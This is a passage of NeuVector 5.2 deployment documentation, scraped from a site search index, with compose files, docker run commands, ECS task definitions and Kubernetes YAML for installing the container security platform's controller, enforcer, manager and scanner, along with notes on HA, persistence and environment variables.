Parallel and Standalone Scanners.  To update the Scanner in order to get the latest CVE database updates from NeuVector, create a cron job to stop and restart the scanner, pulling the latest. See this section for details.  Deployment Without Using Privileged Mode​  For some platform configurations it is possible to deploy the NeuVector containers without requiring them to run in privileged mode. The configuration must support the ability to add capabilities and set the apparmor profile. Note that Docker DataCenter/UCP and Swarm currently do not support this, but it is still possible to deploy NeuVector manually using Compose or Run.  Deploy allinone (NO privileged mode) with docker-compose​  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: neuvector.allinone cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Deploy enforcer (NO privileged mode) with docker-compose​  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: neuvector.enforcer cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   Deploy allinone (privileged mode) with docker run​  You can use docker run instead of compose to deploy. Here are samples.  docker run -d --name allinone \\ --pid=host \\ --privileged \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18300:18300 \\ -p 18301:18301 \\ -p 18400:18400 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -p 8443:8443 \\ -v /lib/modules:/lib/modules:ro \\ -v /var/neuvector:/var/neuvector \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/allinone:&lt;version&gt;   Deploy enforcer (privileged mode) with docker run​  docker run -d --name enforcer \\ --pid=host \\ --privileged \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18301:18301 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -v /lib/modules:/lib/modules:ro \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/enforcer:&lt;version&gt;   Deploy allinone (NO privileged mode) with docker run​  You can use docker run instead of compose to deploy. Here are samples.  docker run -d --name allinone \\ --pid=host \\ --cap-add=SYS_ADMIN \\ --cap-add=NET_ADMIN \\ --cap-add=SYS_PTRACE \\ --cap-add=IPC_LOCK \\ --security-opt label=disable \\ --security-opt apparmor=unconfined \\ --security-opt seccomp=unconfined \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18300:18300 \\ -p 18301:18301 \\ -p 18400:18400 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -p 8443:8443 \\ -v /lib/modules:/lib/modules:ro \\ -v /var/neuvector:/var/neuvector \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/allinone:&lt;version&gt;   Deploy enforcer (NO privileged mode) with docker run​  docker run -d --name enforcer \\ --pid=host \\ --cap-add=SYS_ADMIN \\ --cap-add=NET_ADMIN \\ --cap-add=SYS_PTRACE \\ --cap-add=IPC_LOCK \\ --security-opt label=disable \\ --security-opt apparmor=unconfined \\ --security-opt seccomp=unconfined \\ -e CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] \\ -e NV_PLATFORM_INFO=platform=Docker \\ -p 18301:18301 \\ -p 18401:18401 \\ -p 18301:18301/udp \\ -v /lib/modules:/lib/modules:ro \\ -v /var/run/docker.sock:/var/run/docker.sock:ro \\ -v /sys/fs/cgroup:/host/cgroup:ro \\ -v /proc:/host/proc:ro \\ neuvector/enforcer:&lt;version&gt;   ","version":"5.2","tagName":"h3"},{"title":"Deploy Separate NeuVector Components on Different Hosts​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/5.2/deploying/docker#deploy-separate-neuvector-components-on-different-hosts","content":" If planning to dedicate a docker host to a Controller and/or Manager (no Enforcer) these containers can be deployed individually instead of the Allinone. Note that docker does not support deploying the enforcer on the same node as the controller as separate components, requiring the use of the Allinone container if controller and enforcer functions are desired on a node.  Controller compose file (replace [controller IP] with IP of the first controller node)  controller: image: neuvector/controller:&lt;version&gt; container_name: controller pid: host privileged: true environment: - CLUSTER_JOIN_ADDR=[controller IP] - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 10443:10443 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Docker run can also be used, for example  docker run -itd --privileged --name neuvector.controller -e CLUSTER_JOIN_ADDR=controller_ip -p 18301:18301 -p 18301:18301/udp -p 18300:18300 -p 18400:18400 -p 10443:10443 -v /var/neuvector:/var/neuvector -v /var/run/docker.sock:/var/run/docker.sock:ro -v /proc:/host/proc:ro -v /sys/fs/cgroup/:/host/cgroup/:ro neuvector/controller:&lt;version&gt;   Manager compose file (replace [controller IP] with IP of controller node to connect to). The Docker UCP HRM service uses the default port 8443 which conflicts with the NeuVector console port. If using the default HRM port, then change the NeuVector port mapping in the example below to another port, for example 9443:8443 for the manager container as shown below.  manager: image: neuvector/manager:&lt;version&gt; container_name: nvmanager environment: - CTRL_SERVER_IP=[controller IP] ports: - 9443:8443   The compose file for the Enforcer:  enforcer: image: neuvector/enforcer:&lt;version&gt; pid: host container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   ","version":"5.2","tagName":"h3"},{"title":"Monitoring and Restarting NeuVector​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/5.2/deploying/docker#monitoring-and-restarting-neuvector","content":" Since the NeuVector containers are not deployed as a UCP/Swarm service, they are not automatically started/restarted on nodes. You should set up alerting through your SIEM system for NeuVector SYSLOG events or through DataCenter to detect if a NeuVector container is not running.  ","version":"5.2","tagName":"h3"},{"title":"Deploying Without Privileged Mode​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/5.2/deploying/docker#deploying-without-privileged-mode","content":" In general you’ll need to replace the privileged setting with:   cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable   The above syntax is for Docker EE v17.06.0+. Versions prior to this use the : instead of =, for example apparmor:unconfined.  ","version":"5.2","tagName":"h3"},{"title":"Docker Native Updates​","type":1,"pageTitle":"Docker & Mirantis Kubernetes Engine","url":"/5.2/deploying/docker#docker-native-updates","content":" important Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  docker stop scanner docker rm &lt;scanner id&gt; docker pull neuvector/scanner:latest &lt;docker run command from below&gt;   note docker rm -f &lt;scanner id&gt; can also be used to force stop and removal of the running scanner. For docker-compose docker-compose -f file.yaml down docker-compose -f file.yaml pull // pre-pull the image before starting the scanner docker-compose -f file.yaml up -d Sample docker run docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=node_ip -e SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest And sample docker-compose Scanner: image: neuvector/scanner:latest container_name: scanner environment: - SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 - CLUSTER_JOIN_ADDR=controller_node_ip - CLUSTER_ADVERTISED_ADDR=node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro  ","version":"5.2","tagName":"h3"},{"title":"Amazon ECS","type":0,"sectionRef":"#","url":"/5.2/deploying/ecs","content":"","keywords":"","version":"5.2"},{"title":"Important: Deployment on Amazon ECS is No Longer Supported​","type":1,"pageTitle":"Amazon ECS","url":"/5.2/deploying/ecs#important-deployment-on-amazon-ecs-is-no-longer-supported","content":" The reference section below is not being maintained. However, it may provide some assistance in understanding how to deploy the Allinone on ECS.  ","version":"5.2","tagName":"h3"},{"title":"Deploy on AWS Using ECS​","type":1,"pageTitle":"Amazon ECS","url":"/5.2/deploying/ecs#deploy-on-aws-using-ecs","content":" This is an example of how to deploy NeuVector using ECS.  note Please see the Kubernetes examples for EKS.  Prepare several Amazon ECS instances which have the Docker engine and ECS agent containers built-in. Pick one node for the management console. Then define Security Group rules that allow inbound TCP port 8443 (NeuVector’s default management console port) for access by your client browser. Define a Security Group that allows TCP and UDP ports on 18300, 18301, 18400, 18401 . This is used by NeuVector enforcers to talk to the Controllers/Allinone. Apply this Security Group to all the ECS instances that will be deploying the NeuVector enforcers and controllers/allinone. Set an attribute on the nodes that you want to deploy NeuVector allinone or controller container. For example, if you want to run NeuVector in a controller HA mode, the recommendation is to pick at least 3 nodes then add the attribute to all of the 3 nodes.  This is how to add attributes to your ECS instances:  Select the instance, then pick “View/Edit Attributes” from the Actions drop down menu.    Then add a new attribute. For example “allinone-node” with value “true”.    Create the Allinone Task Definition. Create a new Task Definition for the Allinone container. You can use the ECS interface to manually create it or paste in the sample JSON file (see below for samples). Refer to section “1. Deploying NeuVector” of these docs for how to configure the Allinone.  Enter the placement constraint. For example, if you used the attribute labeling above, then enter this in the constraint.  attribute:allinone-node=~true     note If you examine the updated JSON file now you’ll see the placement constraint added to it.  Create a new service for the Allinone task. Set the “Placement Templates” to “One Task Per Host” so that only one Allinone/Controller can run on any host. You will also see the constraint will be used “memberOf(attribute:allinone-node=~true) which requires the node to have that attribute.    Now you can deploy the Allinone service. Set the “Number of tasks” to the desired Allinone/Controller number. Now the NeuVector Allinone or Controller containers will start running on the nodes selected. After the Allinone starts running you should be able to connect to the NeuVector console through HTTPS on port 8443. Create the Enforcer Task Definition. This is similar to the Allinone task. Configure manually through the ECS console or use the JSON sample below.  For the Enforcer placement constraint you will require that the Enforcer must NOT be on the same node as the allinone.  attribute:allinone-node!~true     Create a new service for the Enforcer task. Again, set the Task Placement to “One Task Per Host” so only one Enforcer is deployed on each host. Also note the additional constraint should show that it prevents deployment on an allinone node.    Deploy this service with desired number of enforcer nodes in “Number of tasks”. Very shortly all the enforcers will be up and running. From the NeuVector console you will be able to see all nodes being detected with enforcers.  ","version":"5.2","tagName":"h3"},{"title":"Sample ECS JSON Task Definitions​","type":1,"pageTitle":"Amazon ECS","url":"/5.2/deploying/ecs#sample-ecs-json-task-definitions","content":" You can use the following samples as starting points for configuring the task definitions for the NeuVector containers.  Create a new task definition, then click Configure Via JSON at bottom. Before pasting in the json below, replace the IP address and image path (find REPLACE in samples). Typically, the IP address would be the Private IP address of the AWS Instance where the allinone will run. You can also specific a different family name than my-allinone/my-enforcer (at the bottom of json).  Sample Allinone json file:  { &quot;networkMode&quot;: &quot;bridge&quot;, &quot;taskRoleArn&quot;: null, &quot;pidMode&quot;: &quot;host&quot;, &quot;containerDefinitions&quot;: [ { &quot;volumesFrom&quot;: [], &quot;memory&quot;: null, &quot;extraHosts&quot;: null, &quot;dnsServers&quot;: null, &quot;disableNetworking&quot;: null, &quot;dnsSearchDomains&quot;: null, &quot;portMappings&quot;: [ { &quot;hostPort&quot;: 18300, &quot;containerPort&quot;: 18300, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18400, &quot;containerPort&quot;: 18400, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18401, &quot;containerPort&quot;: 18401, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;udp&quot; }, { &quot;hostPort&quot;: 8443, &quot;containerPort&quot;: 8443, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 1443, &quot;containerPort&quot;: 10443, &quot;protocol&quot;: &quot;tcp&quot; } ], &quot;hostname&quot;: null, &quot;essential&quot;: true, &quot;entryPoint&quot;: null, &quot;mountPoints&quot;: [ { &quot;containerPath&quot;: &quot;/lib/modules&quot;, &quot;sourceVolume&quot;: &quot;modules&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/var/run/docker.sock&quot;, &quot;sourceVolume&quot;: &quot;dockersock&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/host/proc&quot;, &quot;sourceVolume&quot;: &quot;proc&quot;, &quot;readOnly&quot;: true }, { &quot;containerPath&quot;: &quot;/host/cgroup&quot;, &quot;sourceVolume&quot;: &quot;cgroup&quot;, &quot;readOnly&quot;: true } ], &quot;name&quot;: &quot;allinone&quot;, &quot;ulimits&quot;: null, &quot;dockerSecurityOptions&quot;: null, &quot;environment&quot;: [ { &quot;name&quot;: &quot;CLUSTER_JOIN_ADDR&quot;, &quot;value&quot;: &quot;REPLACE: Private IP&quot; } ], &quot;links&quot;: null, &quot;workingDirectory&quot;: null, &quot;readonlyRootFilesystem&quot;: false, &quot;image&quot;: &quot;REPLACE: Image Path/Name&quot;, &quot;command&quot;: null, &quot;user&quot;: null, &quot;dockerLabels&quot;: { &quot;com.myself.name&quot;: &quot;neuvector&quot; }, &quot;logConfiguration&quot;: null, &quot;cpu&quot;: 0, &quot;privileged&quot;: true, &quot;memoryReservation&quot;: 768 } ], &quot;volumes&quot;: [ { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/lib/modules&quot; }, &quot;name&quot;: &quot;modules&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/var/run/docker.sock&quot; }, &quot;name&quot;: &quot;dockersock&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/proc&quot; }, &quot;name&quot;: &quot;proc&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/sys/fs/cgroup&quot; }, &quot;name&quot;: &quot;cgroup&quot; } ], &quot;family&quot;: &quot;my-allinone&quot;, &quot;placementConstraints&quot;: [] }   Sample Enforcer json file:  { &quot;networkMode&quot;: &quot;bridge&quot;, &quot;taskRoleArn&quot;: null, &quot;pidMode&quot;: &quot;host&quot;, &quot;containerDefinitions&quot;: [ { &quot;volumesFrom&quot;: [], &quot;memory&quot;: null, &quot;extraHosts&quot;: null, &quot;dnsServers&quot;: null, &quot;disableNetworking&quot;: null, &quot;dnsSearchDomains&quot;: null, &quot;portMappings&quot;: [ { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18401, &quot;containerPort&quot;: 18401, &quot;protocol&quot;: &quot;tcp&quot; }, { &quot;hostPort&quot;: 18301, &quot;containerPort&quot;: 18301, &quot;protocol&quot;: &quot;udp&quot; } ], &quot;hostname&quot;: null, &quot;essential&quot;: true, &quot;entryPoint&quot;: null, &quot;mountPoints&quot;: [ { &quot;containerPath&quot;: &quot;/lib/modules&quot;, &quot;sourceVolume&quot;: &quot;modules&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/var/run/docker.sock&quot;, &quot;sourceVolume&quot;: &quot;dockersock&quot;, &quot;readOnly&quot;: null }, { &quot;containerPath&quot;: &quot;/host/proc&quot;, &quot;sourceVolume&quot;: &quot;proc&quot;, &quot;readOnly&quot;: true }, { &quot;containerPath&quot;: &quot;/host/cgroup&quot;, &quot;sourceVolume&quot;: &quot;cgroup&quot;, &quot;readOnly&quot;: true } ], &quot;name&quot;: &quot;enforcer&quot;, &quot;ulimits&quot;: null, &quot;dockerSecurityOptions&quot;: null, &quot;environment&quot;: [ { &quot;name&quot;: &quot;CLUSTER_JOIN_ADDR&quot;, &quot;value&quot;: &quot;REPLACE: Private IP&quot; } ], &quot;links&quot;: null, &quot;workingDirectory&quot;: null, &quot;readonlyRootFilesystem&quot;: false, &quot;image&quot;: &quot;REPLACE: Image Path/Name&quot;, &quot;command&quot;: null, &quot;user&quot;: null, &quot;dockerLabels&quot;: { &quot;com.myself.name&quot;: &quot;neuvector&quot; }, &quot;logConfiguration&quot;: null, &quot;cpu&quot;: 0, &quot;privileged&quot;: true, &quot;memoryReservation&quot;: 512 } ], &quot;volumes&quot;: [ { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/lib/modules&quot; }, &quot;name&quot;: &quot;modules&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/var/run/docker.sock&quot; }, &quot;name&quot;: &quot;dockersock&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/proc&quot; }, &quot;name&quot;: &quot;proc&quot; }, { &quot;host&quot;: { &quot;sourcePath&quot;: &quot;/sys/fs/cgroup&quot; }, &quot;name&quot;: &quot;cgroup&quot; } ], &quot;family&quot;: &quot;my-enforcer&quot;, &quot;placementConstraints&quot;: [] }   ","version":"5.2","tagName":"h3"},{"title":"Live Updating NeuVector​","type":1,"pageTitle":"Amazon ECS","url":"/5.2/deploying/ecs#live-updating-neuvector","content":" You can do a live update of the NeuVector containers in ECS without interrupting services. NeuVector’s services can be easily updated or upgraded without interrupting any running services. To do that in Amazon ECS:  If you have multiple controllers or Allinones deployed as a cluster, ignore this step. If there is only a single Allinone/controller in the system, find a new ECS instance and deploy a 2nd Allinone/controller container on it (follow the NeuVector allinone/controller ECS deployment steps). After deployed, in the NeuVector management console, you will see this new controller up and running (under Resources &gt; Controllers). This is required so that all stateful data is replicated between controllers. In ECS Services, reset and delete the old Allinone/controller service. Pull the updated NeuVector images manually or trigger AWS ECS to pull new versions of Allinone/controller containers from Dockerhub or your private registry. Create a new revision of the Allinone/Controller task, update the “CLUSTER_JOIN_ADDR” to the 2nd Allinone/controller’s private node IP address. Create a new service to deploy this new task (follow the same steps to deploy on ECS). After completed, the new version of the Allinone/controller should be up and running. From the NeuVector management console, all the logs and policies should still be there. Optionally, you can bring down the 2nd Allinone/Controller container now since there should be a Allinone/Controller now started on the original node. From ECS Services, shutdown and update the Enforcers. Manually or auto-trigger the pulling of new Enforcer images. Then restart or update the Enforcer on all nodes. From the NeuVector console, you will see all Enforcers are up to date. If you are using the separate Manager container instead of the Allinone (which already has the manager in it), simply shutdown and remove the old manager container. Then pull the new manager version, and deploy it, pointing the CLUSTER_JOIN_ADDR to the IP of the controller.  All NeuVector containers are now updated live. All policies, logs, and configurations are unaffected. The live graph view will be regenerated automatically as soon as there is new live traffic flowing between containers. ","version":"5.2","tagName":"h3"},{"title":"Deploying NeuVector","type":0,"sectionRef":"#","url":"/5.2/deploying/production","content":"","keywords":"","version":"5.2"},{"title":"Planning Deployments​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#planning-deployments","content":" The NeuVector containers in a default deployment include the controller, manager, enforcer, scanner, and updater. Placement of where these containers (on which nodes) are deployed must be considered, and appropriate labels, taints or tolerations created to control them.  The enforcer should be deployed on every host/node where application containers to be monitored and protected by NeuVector will be running.  The controller manages the cluster of enforcers, and can be deployed on the same node as an enforcer or on a separate management node. The manager should be deployed on the node where the controller is running, and will provide console access to the controller. Other required NeuVector containers such as the manager, scanner, and updater are described in more detail in the Best Practices guide referenced below.  If you haven’t done so, pull the images from the NeuVector Docker Hub.  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.2.0neuvector/controller:5.2.0neuvector/enforcer:5.2.0neuvector/scanner:latestneuvector/updater:latest  Please be sure to update the image references in appropriate yaml files.  If deploying with the current NeuVector Helm chart (v1.8.9+), the following changes should be made to values.yml:  Update the registry to docker.ioUpdate image names/tags to the current version on Docker Hub, as shown aboveLeave the imagePullSecrets empty  Best Practices, Tips, Q&amp;A for Deploying and Managing NeuVector​  Download and review this Deployment Best Practices document for tips such as performance and sizing, best practices, and frequently asked questions about deployments.  ","version":"5.2","tagName":"h3"},{"title":"Deployment Using Helm or Operators​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#deployment-using-helm-or-operators","content":" Automated deployment using Helm can be found at https://github.com/neuvector/neuvector-helm.  Deployment using an Operator, including RedHat Certified Operator and Kubernetes community operator is supported, with a general description here. The NeuVector RedHat operator is at https://access.redhat.com/containers/#/registry.connect.redhat.com/neuvector/neuvector-operator, and the community operator at https://operatorhub.io/operator/neuvector-operator.  ","version":"5.2","tagName":"h3"},{"title":"Deployment Using ConfigMap​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#deployment-using-configmap","content":" Automated deployment on Kubernetes is supported using a ConfigMap. Please see the Deploying Using ConfigMap section for more details.  ","version":"5.2","tagName":"h3"},{"title":"Deploying the Controllers​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#deploying-the-controllers","content":" We recommend that multiple controllers be run for a high availability (HA) configuration. The controllers use the consensus based RAFT protocol to elect a leader and if the leader goes down, to elect another leader. Because of this, the number of active controllers should be an odd number, for example 3, 5, 7 etc.  ","version":"5.2","tagName":"h3"},{"title":"Controller HA​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#controller-ha","content":" The controllers will synchronize all data between themselves, including configuration, policy, conversations, events, and notifications.  If the primary active controller goes down, a new leader will automatically be elected and take over.  Take special precautions to make sure there is always one controller running and ready, especially during host OS or orchestration platform updates and reboots.  ","version":"5.2","tagName":"h3"},{"title":"Backups and Persistent Data​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#backups-and-persistent-data","content":" Be sure to periodically export the configuration file from the console and save it as a backup.  If you run multiple controllers in an HA configuration, as long as one controller is always up, all data will be synchronized between controllers.  If you wish to save logs such as violations, threats, vulnerabilities and events please enable the SYSLOG server in Settings.  NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/ from the controller pod. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  Persistent Volume Example​  The PersistentVolume defined in the cluster is required for persistent volume support. The requirement for NeuVector is that the accessModes needs to be ReadWriteMany(RWX). Not all storage types support the RWX access mode. For example, on GKE you may need to create a RWX persistent volume using NFS storage.  Once the PersistentVolume is created, there needs to be created a PersistentVolumeClaim as below for Controller. Currently the persistent volume is used only for the NeuVector configuration backup files in the controller (Policies, Rules, user data, integrations etc).  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector spec: accessModes: - ReadWriteMany volumeMode: Filesystem resources: requests: storage: 1Gi   Here is an example for IBM Cloud:  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector labels: billingType: &quot;hourly&quot; region: us-south zone: sjc03 spec: accessModes: - ReadWriteMany resources: requests: storage: 5Gi iops: &quot;100&quot; storageClassName: ibmc-file-retain-custom   After the Persistent Volume Claim is created, modify the NeuVector sample yaml file as shown below (old section commented out):  ... spec: template: spec: volumes: - name: nv-share # hostPath: // replaced by persistentVolumeClaim # path: /var/neuvector // replaced by persistentVolumeClaim persistentVolumeClaim: claimName: neuvector-data   Also add the following environment variable in the Controller or Allinone sample yamls for persistent volume support. This will make the Controller read the backup config when starting.   - name: CTRL_PERSIST_CONFIG   ConfigMaps and Persistent Storage​  Both the ConfigMaps and the persistent storage backup are only read when a new NeuVector cluster is deployed, or the cluster fails and is restarted. They are not used during rolling upgrades.  The persistent storage configuration backup is read first, then the ConfigMaps are applied, so ConfigMap settings take precedence. All ConfigMap settings (e.g. updates) will also be saved into persistent storage.  For more information see the ConfigMaps section.  ","version":"5.2","tagName":"h3"},{"title":"Updating CVE Vulnerability Database in Production​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#updating-cve-vulnerability-database-in-production","content":" Please see each sample section for instructions on how to keep the CVE database updated.  The CVE database version can be seen in the Console in the Vulnerabilities tab. You can also inspect the Updater container image.  docker inspect neuvector/updater   &quot;Labels&quot;: { &quot;neuvector.image&quot;: &quot;neuvector/updater&quot;, &quot;neuvector.role&quot;: &quot;updater&quot;, &quot;neuvector.vuln_db&quot;: &quot;1.255&quot; }   After running the update, inspect the controller/allinone logs for 'version.' For example in Kubernetes:  kubectl logs neuvector-controller-pod-777fdc5668-4jkjn -n neuvector | grep version ... 2019-07-29T17:04:02.43 |DEBU|SCN|main.dbUpdate: New DB found - create=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:02.454|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:12.224|DEBU|SCN|main.scannerRegister: - version=1.576   ","version":"5.2","tagName":"h3"},{"title":"Accessing the Console​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#accessing-the-console","content":" By default the console is exposed as a service on port 8443, or nodePort with a random port on each host. Please see the first section Basics -&gt; Connect to Manager for options for turning off HTTPS or accessing the console through a corporate firewall which does not allow port 8443 for the console access.  ","version":"5.2","tagName":"h3"},{"title":"Handing Host Updates or Auto-Scaling Nodes with a Pod Disruption Budget​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#handing-host-updates-or-auto-scaling-nodes-with-a-pod-disruption-budget","content":" Maintenance or scaling activities can affect the controllers on nodes. Public cloud providers support the ability to auto-scale nodes, which can dynamically evict pods including the NeuVector controllers. To prevent disruptions to the controllers, a NeuVector pod disruption budget can be created.  For example, create the file below nv_pdb.yaml to ensure that there are at least 2 controllers running at any time.  apiVersion: policy/v1beta1 kind: PodDisruptionBudget metadata: name: neuvector-controller-pdb namespace: neuvector spec: minAvailable: 2 selector: matchLabels: app: neuvector-controller-pod   Then  kubectl create -f nv_pdb.yaml   For more details: https://kubernetes.io/docs/tasks/run-application/configure-pdb/  ","version":"5.2","tagName":"h3"},{"title":"Deploy Without Privileged Mode​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#deploy-without-privileged-mode","content":" On some systems, deployment without using privileged mode is supported. These systems must support seccom capabilities and setting the apparmor profile.  See the section on Docker deployment for sample compose files.  ","version":"5.2","tagName":"h3"},{"title":"Multi-site, Multi-Cluster Architecture​","type":1,"pageTitle":"Deploying NeuVector","url":"/5.2/deploying/production#multi-site-multi-cluster-architecture","content":" For enterprises with multiple locations and where a separate NeuVector cluster can be deployed for each location, the following is a proposed reference architecture. Each cluster has its own set of controllers and is separately managed.    See a more detailed description in this file &gt;NeuVector Multi-Site Architecture ","version":"5.2","tagName":"h3"},{"title":"Environment Variables Details","type":0,"sectionRef":"#","url":"/5.2/deploying/production/details","content":"","keywords":"","version":"5.2"},{"title":"Environment Variables​","type":1,"pageTitle":"Environment Variables Details","url":"/5.2/deploying/production/details#environment-variables","content":" For Both Controller (Allinone) and Enforcer​  CLUSTER_JOIN_ADDR  Set the variable to the host IP for the first controller; and set it to the master controller's host IP for other controllers and enforcers. It’s not necessary to set this IP for Kubernetes based deployments, just use the sample file.  CLUSTER_LAN_PORT  (Optional) Cluster Serf LAN port. Both TCP and UDP ports must be mapped to the host directly. Optional if there is no port conflict on the host. Default 18301  DOCKER_URL  (Optional) If the docker engine on the host does not bind on the normal Unix socket, use this variable to specify the TCP connection point, in the format of tcp://10.0.0.1:2376.  NV_PLATFORM_INFO  (Optional) Use value platform=Docker for Docker Swarm/EE deployments, or platform=Kubernetes:GKE for GKE (to run GKE CIS Benchmarks).  CUSTOM_CHECK_CONTROL  (Optional) Used to enable/disable ability to create custom compliance scripts in containers/hosts. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).  AUTO_PROFILE_COLLECT  (Optional) Set value to 1 to enable collection of memory profile data to help investigate memory pressure issues.  Controller​  CTRL_PERSIST_CONFIG  (Optional) To backup configuration files and restore them from a persistent volume. Add this to the yaml to enable; remove to disable.  CLUSTER_RPC_PORT  (Optional) Cluster server RPC port. Must be mapped to the host directly. The environment variable is optional if there is no port conflict on the host. Default 18300  CTRL_SERVER_PORT  (Optional) HTTPS port that the REST server should be listening on. Default is 10443. Normally it can be left as default and use docker port option to map the port on the host.  DISABLE_PACKET_CAPTURE  (Optional) Add this to the yaml to disable packet capture; remove to re-enable (default).  NO_DEFAULT_ADMIN  (Optional) When enabled does not create an 'admin' user in the local cluster. This is used for Rancher SSO integration as the default. If not enabled, persistently warn the user 